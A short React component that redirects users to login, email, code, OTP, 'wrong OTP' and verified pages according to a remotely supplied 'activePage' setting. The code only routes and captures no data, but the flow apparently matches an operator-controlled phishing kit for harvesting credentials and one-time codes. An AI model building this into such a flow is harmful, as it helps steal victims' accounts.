import { useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import usePageController from "../pages/useContoller";

const routes = {
    landing: "/",
    email: "/email",
    code: "/code",
    security: "/security",
    otp: "/otp",
    otp2: "/wrongOtp",
    verified: "/verified",
};

export default function PageWatcher() {

    const settings = usePageController();

    const navigate = useNavigate();

    const location = useLocation();

    useEffect(() => {

        if (!settings) return;

        const destination = routes[settings.activePage];

        if (location.pathname !== destination) {
            navigate(destination, { replace: true });
        }

    }, [settings, location.pathname]);

    return null;
}